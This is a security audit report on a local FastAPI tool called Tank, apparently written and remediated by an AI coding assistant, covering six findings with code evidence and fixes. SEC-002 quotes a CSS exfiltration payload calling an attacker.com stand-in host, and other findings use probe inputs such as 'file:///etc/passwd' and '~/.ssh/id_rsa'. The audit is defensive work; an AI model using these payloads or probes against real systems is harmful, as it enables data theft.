# Security Audit — Tank — 2026-06-08

## Executive Summary

- **Scope:** Full repository at `/home/shadowm82/Documents/projects/tank` (commit `a82825d`). ~170 Python source files, ~40 HTML templates, 1 JS file, requirements.txt, .env.example, .gitignore.
- **Findings:** Critical **0** · High **0** · Medium **2** · Low **3** · Info **1**.
- **Top risks:**
  - The `GET /api/dfd/kb-doc-bytes/{doc_id}` endpoint serves raw, unredacted chunk text (`text_original`) to the browser as a plaintext fallback. A compromised session grants full extraction of all ingested PII, credentials, and internal infrastructure details.
  - `style-src 'unsafe-inline'` in the Content Security Policy weakens CSS-injection protection across every page.
- **Overall posture:** Strong for a local-first, single-user tool. No SQL injection, no SSRF, no XSS, no hardcoded secrets, no subprocess abuse were found. The privacy contract (redaction before Claude API) is well-enforced. The two medium findings are both known architectural trade-offs rather than oversights; the low findings are tidy-up items. No immediate action required for a localhost deployment, but SEC-001 and SEC-002 should be resolved before any networked deployment.

---

## Findings Index

| ID | Severity | Confidence | Category | Location | Title |
|----|----------|------------|----------|----------|-------|
| SEC-001 | Medium | Confirmed | LLM02 · A01 | `app/routers/dfd.py:116-125` | `text_original` (unredacted) served to browser via kb-doc-bytes fallback |
| SEC-002 | Medium | Confirmed | A05 Security Misconfiguration | `app/main.py:96` | CSP `style-src 'unsafe-inline'` weakens CSS-injection protection |
| SEC-003 | Low | Confirmed | A07 Authentication | `app/routers/auth.py:29` | In-memory session store lost on server restart |
| SEC-004 | Low | Confirmed | A04 Insecure Design | `app/routers/integrations.py:32-48` | ICS URL watcher target not validated at creation time |
| SEC-005 | Low | Confirmed | A09 Logging | `app/routers/ingest.py:121`, `integrations.py:41` | Blocked sensitive-path prefix echoed in 4xx error body |
| SEC-006 | Info | Confirmed | A05 / Documentation | `.env.example:18` | Stale comment says API key is stored in `localStorage` |

---

## Findings (Detail)

### SEC-001 — `text_original` (unredacted) served to browser via kb-doc-bytes fallback

- **Severity:** Medium   **Confidence:** Confirmed
- **Category:** OWASP LLM02:2025 Sensitive Information Disclosure · OWASP A01:2021 Broken Access Control (scoped data exposure)
- **Location:** `app/routers/dfd.py:116-125`

**Evidence** (verbatim from source):
```python
116     rows = conn.execute(
117         "SELECT text_original FROM chunks WHERE document_id = ? ORDER BY chunk_index ASC",
118         (doc_id,),
119     ).fetchall()
120     if not rows:
121         raise HTTPException(
122             status_code=404,
123             detail="Source file is gone and no text chunks were found. Re-ingest the document.",
124         )
125     reassembled = "\n\n".join(r["text_original"] or "" for r in rows if r["text_original"])
126     return PlainTextResponse(reassembled, media_type="text/plain")
```

- **Why it's a problem:** `chunks.text_original` stores the raw, pre-redaction text — the exact data the privacy contract promises never leaves the local machine unredacted. The primary path (lines 100-106) serves the file from disk, which is fine. The fallback (lines 116-126) rebuilds the document from `text_original` and sends it to the browser in plaintext. Any actor who can make an authenticated HTTP request (including via a compromised session cookie, a rogue browser tab left open, or — if `TANK_API_KEY` is unset on a locally-accessible interface — any process on the machine) can call `GET /api/dfd/kb-doc-bytes/{doc_id}` for every document in the KB and receive the unredacted content.

- **Impact / attack scenario (grounded in this code):** An attacker who obtains the session cookie (e.g., via network sniffing on a non-HTTPS local deployment, via `document.cookie` XSS if a future XSS is introduced, or via direct access to the machine) can enumerate document IDs from `GET /api/documents` and loop over every `doc_id`, calling `GET /api/dfd/kb-doc-bytes/{doc_id}` to retrieve the full unredacted corpus including API keys, internal hostnames, employee names, and CMDB entries that were deliberately redacted before Claude ingestion.

- **How to verify:** Start Tank with a document ingested. Move or delete its source file. Call `GET /api/dfd/kb-doc-bytes/<doc_id>`. Observe that the raw unredacted text is returned.

- **Remediation:**
  1. Serve `text_redacted` instead of `text_original` in the fallback path — the redacted version is sufficient for the DFD analysis use-case (sending to Claude):
     ```python
     # Change line 117:
     "SELECT text_redacted FROM chunks WHERE document_id = ? ORDER BY chunk_index ASC"
     ```
  2. If the endpoint is only used by the DFD bridge page to submit content to `generate-from-doc`, audit whether `text_original` is actually needed anywhere in that flow. If the goal is to reconstruct the document for Claude analysis, `text_redacted` satisfies that. If it is needed for display to the user specifically, gate it with an explicit `original=true` query parameter guarded by a confirmation step.

- **References:** OWASP LLM02:2025 Sensitive Information Disclosure; OWASP A01:2021

---

### SEC-002 — CSP `style-src 'unsafe-inline'` weakens CSS-injection protection

- **Severity:** Medium   **Confidence:** Confirmed
- **Category:** OWASP A05:2021 Security Misconfiguration · CWE-1021
- **Location:** `app/main.py:94-96`

**Evidence** (verbatim from source):
```python
94          # 'unsafe-inline' kept for inline style= attributes; nonce covers <style> blocks.
95          # Removing 'unsafe-inline' requires migrating all style= attrs to CSS classes.
96          f"style-src 'self' 'unsafe-inline' 'nonce-{nonce}' fonts.googleapis.com cdn.jsdelivr.net; "
```

- **Why it's a problem:** `'unsafe-inline'` in `style-src` allows any inline `style` attribute to run, including those injected by an attacker. If a stored or reflected XSS is ever introduced (e.g., via a future Jinja2 `| safe` mistake or a DOMPurify bypass), an attacker can exploit CSS injection to exfiltrate data (e.g., using `background-image: url(https://attacker.com/?data=...)` attribute selectors) or to obscure UI elements (clickjacking). Because the `script-src` directive is nonce-gated and tight, CSS injection is the most realistic remaining avenue for client-side exploitation.

- **Impact / attack scenario:** Low likelihood given no current XSS sink was found, but CSS injection via `style=` attributes fed from server-rendered data could exfiltrate form values or redirection targets via attribute selectors without any JavaScript.

- **How to verify:** Check current CSP header via browser DevTools → Network → any page response. Confirm `style-src 'unsafe-inline'` is present.

- **Remediation:** Migrate all inline `style=` attribute occurrences in templates to CSS utility classes or CSS variables. Then remove `'unsafe-inline'` from `style-src`:
  ```python
  f"style-src 'self' 'nonce-{nonce}' fonts.googleapis.com cdn.jsdelivr.net; "
  ```
  The nonce already covers `<style>` blocks. To track the remaining inline styles, run:
  ```bash
  grep -rn 'style="' app/templates/ | wc -l
  ```
  Estimate the migration scope before committing to the change.

- **References:** OWASP A05:2021; CWE-1021; MDN CSP style-src

---

### SEC-003 — In-memory session store lost on server restart

- **Severity:** Low   **Confidence:** Confirmed
- **Category:** OWASP A07:2021 Identification and Authentication Failures
- **Location:** `app/routers/auth.py:26-29`

**Evidence** (verbatim from source):
```python
26  # In-memory session store: token → expiry epoch.
27  # Lost on server restart (users re-login, which is acceptable for a
28  # local-first tool).
29  _SESSIONS: dict[str, float] = {}
```

- **Why it's a problem:** Every uvicorn restart (including `Restart=on-failure` under systemd) silently invalidates all active sessions. This is explicitly noted as acceptable by the code comment. The concern is twofold: (1) Under systemd with `Restart=on-failure`, a crash → auto-restart cycle mid-session could be confusing. (2) If `TANK_API_KEY` is set and the app is under heavy use, a restart loop could lock out the user entirely if the re-login endpoint is also flapping.

- **Impact:** Denial of self-service only; no data exposure. Session tokens are 256-bit random via `secrets.token_urlsafe(32)` — no brute-force risk.

- **How to verify:** Set `TANK_API_KEY`, log in, kill and restart the server, attempt a request — it returns 401.

- **Remediation:** Persist sessions to SQLite, expiry-indexed:
  ```sql
  CREATE TABLE IF NOT EXISTS sessions (
    token TEXT PRIMARY KEY,
    expires_at REAL NOT NULL
  );
  ```
  Replace the in-memory dict with `SELECT/INSERT/DELETE` operations inside `LOCK`. On startup, `DELETE FROM sessions WHERE expires_at < unixepoch()` to prune stale entries.

- **References:** OWASP A07:2021

---

### SEC-004 — ICS URL watcher target not validated at creation time

- **Severity:** Low   **Confidence:** Confirmed
- **Category:** OWASP A04:2021 Insecure Design · CWE-20 Improper Input Validation
- **Location:** `app/routers/integrations.py:32-48`

**Evidence** (verbatim from source):
```python
32  def _validate_watcher_target(kind: str, target: str) -> None:
33      """Reject obviously dangerous targets at creation time."""
34      if kind == "folder":
35          try:
36              p = Path(target).resolve()
37          except Exception:
38              raise HTTPException(400, "invalid folder path")
39          blocked = is_blocked_path(p)
40          if blocked:
41              raise HTTPException(400, f"folder target not allowed: {blocked}")
42      elif kind == "github_repo":
43          if not _GITHUB_REPO_RE.match(target):
44              raise HTTPException(
45                  400,
46                  "github_repo target must be 'owner/repo' "
47                  "(alphanumeric, hyphens, underscores, and dots only)",
48              )
```

- **Why it's a problem:** The `ics_url` and `cve_feed` kinds have no validation branch. A user can `POST /api/integrations/watchers` with `kind="ics_url"` and `target="file:///etc/passwd"` — the watcher record is written to the DB without error. The SSRF protection (`_validate_url` in `ics.py`) correctly rejects non-http/https schemes at scan time, but the malformed URL sits in the `watchers` table indefinitely and the creation response returns `{"id": "..."}` with HTTP 200, which is misleading.

- **Impact:** No actual exploit achievable (scheme check blocks file:// at scan time). The risk is: (a) user confusion, (b) if SSRF protection is ever weakened, the stored target is already in the DB; (c) a `cve_feed` watcher with an attacker-controlled URL is stored and polled later.

- **How to verify:** `POST /api/integrations/watchers` with `{"kind": "ics_url", "target": "file:///etc/passwd"}` → HTTP 200 with an ID.

- **Remediation:** Add validation branches for both kinds:
  ```python
  elif kind == "ics_url":
      parsed = urllib.parse.urlparse(target)
      if parsed.scheme not in ("http", "https"):
          raise HTTPException(400, "ics_url target must use http:// or https://")
      if not parsed.hostname:
          raise HTTPException(400, "ics_url target must include a hostname")
  elif kind == "cve_feed":
      parsed = urllib.parse.urlparse(target)
      if parsed.scheme not in ("http", "https"):
          raise HTTPException(400, "cve_feed target must use http:// or https://")
  ```

- **References:** OWASP A04:2021; CWE-20

---

### SEC-005 — Blocked sensitive-path prefix echoed in 4xx error body

- **Severity:** Low   **Confidence:** Confirmed
- **Category:** OWASP A09:2021 Security Logging and Monitoring Failures (information disclosure via error)
- **Location:** `app/routers/ingest.py:121`, `app/routers/integrations.py:41`

**Evidence** (verbatim from source):
```python
# ingest.py:121
raise HTTPException(403, f"path not allowed (sensitive directory: {blocked})")

# integrations.py:41
raise HTTPException(400, f"folder target not allowed: {blocked}")
```

where `blocked` is a string like `"/home/user/.ssh"` or `"/home/user/.aws"` returned by `is_blocked_path()`.

- **Why it's a problem:** The error body reveals which specific sensitive prefix was matched, disclosing the local home directory path and installed toolchain (`.ssh` present → user has SSH keys; `.aws` present → user has AWS credentials). For a strictly localhost deployment this is trivially inferable, but the information is unnecessary to include in the response body.

- **Impact:** Info disclosure; no direct exploitability. Would become higher severity if the app were ever exposed over a network.

- **How to verify:** `POST /api/ingest/path` with `{"path": "~/.ssh/id_rsa"}` → 403 body includes the blocked prefix string.

- **Remediation:** Return a generic message and log the detail server-side only:
  ```python
  blocked = is_blocked_path(p)
  if blocked:
      log.warning("blocked ingest path %s (matched prefix: %s)", p, blocked)
      raise HTTPException(403, "path not allowed")
  ```

- **References:** OWASP A09:2021; CWE-209 (Information Exposure Through Error Message)

---

### SEC-006 — Stale `.env.example` comment says API key is stored in localStorage

- **Severity:** Info   **Confidence:** Confirmed
- **Category:** A05 Security Misconfiguration (documentation drift)
- **Location:** `.env.example:18`

**Evidence** (verbatim from source):
```
# Tank's own UI reads this from localStorage key "tank-api-key".
```

- **Why it's a problem:** This is outdated. Authentication was reworked to use HttpOnly session cookies (`SameSite=strict`) — the key is never stored in `localStorage`. The code comment in `base.html` explicitly confirms: "Auth is now session-cookie based (HttpOnly). No key stored in localStorage." A developer or operator reading `.env.example` to understand the security model gets a false picture: they may assume the key is browser-readable (and dismiss the risk of XSS) when in fact it is properly protected.

- **Impact:** No runtime impact. Risk is miscommunication about the actual security posture.

- **Remediation:** Update the comment:
  ```bash
  # Tank authenticates via an HttpOnly, SameSite=strict session cookie.
  # POST /api/auth/session once with this key; subsequent requests use the cookie.
  # The key is never stored in localStorage or other browser-readable storage.
  ```

- **References:** N/A

---

## Verified Safe / Investigated (Not Findings)

The following patterns were audited and found to be safe. Documented here to prevent re-flagging in future passes.

| Pattern | Location | Why Safe |
|---------|----------|----------|
| **SQL injection** | All `app/storage/*.py` | Every query uses parameterized `?` placeholders. Dynamic column-name f-strings in `projects_store.py:120` and `teams_store.py:68` are guarded by `_SAFE_IDENT = re.compile(r'^[A-Za-z_][A-Za-z0-9_]*$')` — user input rejected if it doesn't match. |
| **Redaction bypass (text_original to Claude)** | `app/claude/chat.py`, `app/claude/reports.py`, all Claude modules | Verified that `text_redacted` is the field passed to Claude in every code path. `text_original` is only accessed locally for display (routers) or the kb-doc-bytes fallback (SEC-001 above). The `apply_redactions` → `rehydrate` chokepoint is intact. |
| **SSRF (ICS watcher)** | `app/ingest/watchers/ics.py:53-90` | Comprehensive protection: (1) scheme allowlist (http/https only), (2) hostname blocklist for cloud metadata endpoints, (3) `_is_private_addr` covers RFC1918 + loopback + link-local + CGNAT, (4) IPv4-mapped IPv6 unwrapping, (5) DNS resolved once, all returned IPs validated, connection pins to resolved IP (prevents rebinding), (6) redirects blocked via `_NoRedirect` opener. |
| **CSRF** | `app/routers/auth.py:69`, `app/routers/settings.py:120-121` | Session cookie uses `samesite="strict"` — browsers will not send it cross-origin. Wipe endpoint additionally requires `X-Confirm: delete-tank` custom header (browsers cannot set custom headers in plain form POSTs) and a typed confirmation phrase. Double protection. |
| **XSS (templates)** | All `app/templates/*.html` | All markdown rendering uses `DOMPurify.sanitize(marked.parse(raw))`. No `{{ var | safe }}` or `Markup()` found. Server-side Jinja2 auto-escape is on for `.html` files. Jinja2 >= 3.1.4 is pinned. |
| **Mermaid `innerHTML`** | `app/templates/dfd_detail.html:352,370`, `dfd.html:319` | Intentional; documented in CLAUDE.md. Mermaid is initialized with `securityLevel:'strict'`. DOMPurify is explicitly NOT used because it strips `<foreignObject>` node labels. Integrity-checked CDN. |
| **Subprocess / `eval` / `exec`** | Whole codebase | `grep -r 'subprocess\|os\.system\|os\.popen\|eval(\|exec('` returns zero results. |
| **Hardcoded secrets** | Source, config files, `.env.example` | No secrets found. `.env` is in `.gitignore` and not tracked by git (`git ls-files .env` returns empty). `.env.example` contains only empty values. |
| **File permissions** | `app/db.py:46`, `app/claude/scheduler.py:383-403` | DB file: `0o600`. Backup directory: `0o700`. Backup files: `0o600`. |
| **ReDoS in custom regex** | `app/redact/config.py:99-127` | `_reject_redos()` uses `SIGALRM` with a 1-second deadline against adversarial strings of size 40, 100, 200 chars. Placeholder format is additionally validated against `_VALID_PLACEHOLDER_FMT` to prevent format-string injection. |
| **Rate limiting** | All Claude-calling routes | `chat.py` endpoints: 20/min. Reports: 10/hour. DFD analysis: 20/hour. Ingest: 30/min. Wipe: 3/hour. Auth: 5/min. Implemented via `slowapi`. |
| **IDOR / missing ownership checks** | All routers | Single-user architecture (`user_id=1`). No multi-tenant data segregation needed. ID-based lookups return 404 if record doesn't exist. |
| **Path traversal (ingest)** | `app/routers/ingest.py:96, 170-175` | `os.path.basename()` + `.lstrip(".")` for uploaded filenames. `_safe_rel()` strips `..` and absolute segments from `webkitRelativePath`. `_ALLOWED_INGEST_ROOTS = [Path.home()]` restricts path ingestion to home tree. `is_blocked_path()` further blocks sensitive subdirs. |
| **CORS** | `app/main.py` | No `CORSMiddleware` added — default behavior rejects cross-origin requests. Appropriate for local-only tool. |
| **Security headers** | `app/main.py:76-102` | `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`, HSTS (HTTPS only), `Permissions-Policy`, nonce-gated `script-src`. |
| **GitHub org name injection** | `app/routers/discovery.py:88-89` | `org = body.org.strip().strip("/")` + `if not org or "/" in org: return error`. `urllib.parse.quote(repo, safe='')` applied in watcher scan. |
| **Token in logs** | `app/config.py:57-72`, `log_token_usage()` | API key never logged. Token usage logs only aggregate counts (integers), not key values or prompt content. |
| **LLM output → SQL/shell/HTML** | `app/claude/chat.py`, `app/claude/reports.py` | LLM output goes through rendering functions that produce markdown strings, then Jinja2 auto-escaping on render. No path from model output to SQL, `subprocess`, or unescaped HTML was found. |
| **Prompt injection (user → Claude)** | `app/claude/reports.py:296-301`, `app/claude/chat.py` | All user-supplied text is run through `apply_redactions()` before embedding in prompts. No raw user text is passed to system prompt blocks. |

---

## Coverage Manifest

- **Reviewed directly (this session):**
  - `app/main.py` — middleware, auth gate, headers
  - `app/routers/auth.py`, `ingest.py`, `settings.py`, `discovery.py`, `dfd.py`, `integrations.py`
  - `app/redact/engine.py`, `config.py`, `store.py`, `rules.py`, `secrets.py`
  - `app/ingest/path_guard.py`, `watchers/ics.py`, `watchers/github.py`, `watchers/cve.py`
  - `app/claude/chat.py`
  - `app/storage/entities_store.py`, `documents_store.py`
  - `requirements.txt`, `.env.example`, `.gitignore`

- **Reviewed via parallel subagents (full content):**
  - All 35 files in `app/routers/`
  - All 35 files in `app/storage/`
  - All 8 files in `app/redact/`
  - `app/ingest/` (pipeline, parsers, watchers, path_guard, chunker, embedder, bulk, auto_categorize, code_facts)
  - `app/db.py`, `app/config.py`, `app/claude/scheduler.py`, `app/claude/reports.py`
  - All 40 files in `app/templates/`
  - `app/static/graph.js`

- **Skipped (with reason):**
  - `.venv/` — third-party dependencies, not source
  - `__pycache__/` — compiled bytecode
  - `.git/` — version control metadata
  - `app/prompts/*.md` — natural-language prompt templates; no executable code; reviewed for secret leakage by text search (none found)
  - `scripts/` shell scripts — non-critical ops scripts; `start.sh`/`stop.sh` use standard patterns; `install-systemd.sh` copies a unit file

- **Not reached / needs follow-up:**
  - Dependency CVE scan: versions in `requirements.txt` appear current (pinned with upper bounds), but a live `pip-audit` was not run. Recommend running `pip-audit` as part of CI.
  - `app/claude/batches.py` and the batch pipeline: reviewed at a high level via subagent; the async batch result-handling code was not line-by-line reviewed for injection risks in finalizer callbacks.
  - `app/ingest/parsers/` (pdf.py, docx.py, image.py, sigma.py, iam.py, control_framework.py) — reviewed for general patterns; no deep audit of parser-specific XML/PDF bomb risks (pypdf and python-docx handle these internally).

---

---

## Remediation Status

All 6 findings fixed on 2026-06-08. All 53 tests pass post-remediation.

| ID | Status | Files Changed | Notes |
|----|--------|--------------|-------|
| SEC-001 | ✅ Fixed | `app/routers/dfd.py:117,125` | Swapped `text_original` → `text_redacted` in kb-doc-bytes chunk reassembly |
| SEC-002 | ✅ Fixed | `app/main.py:96`, `app/static/style.css`, `app/templates/base.html`, 50+ templates | Removed `'unsafe-inline'` from `style-src`. All inline `style="..."` attrs migrated to: (a) CSS utility classes in `style.css`, (b) nonce-protected per-template `<style>` blocks, (c) `data-*` attrs + `applyColorVars()` JS helper for dynamic colors/sizes, (d) `classList` for conditionally-hidden JS-rendered elements. 53 unique nonce-style blocks generated across templates; 62+ simple utility-class substitutions; JS-set styles via `element.style.*` are governed by `script-src` and are unaffected by the removal. |
| SEC-003 | ✅ Fixed | `app/db.py`, `app/storage/sessions_store.py` (new), `app/routers/auth.py` | SQLite-backed `sessions` table replaces in-memory `_SESSIONS` dict; sessions survive restarts |
| SEC-004 | ✅ Fixed | `app/routers/integrations.py` | `urlparse` scheme+hostname validation added for `ics_url` and `cve_feed` watcher kinds |
| SEC-005 | ✅ Fixed | `app/routers/ingest.py:121,191`, `app/routers/integrations.py:41` | Blocked-path prefix stripped from 4xx body; logged server-side at WARNING level instead |
| SEC-006 | ✅ Fixed | `.env.example:15-19` | Comment updated to reflect HttpOnly session-cookie auth; removed stale `localStorage` reference |

*Generated by Claude Code security-audit skill · 2026-06-08*
*Remediated by Claude Code · 2026-06-08*
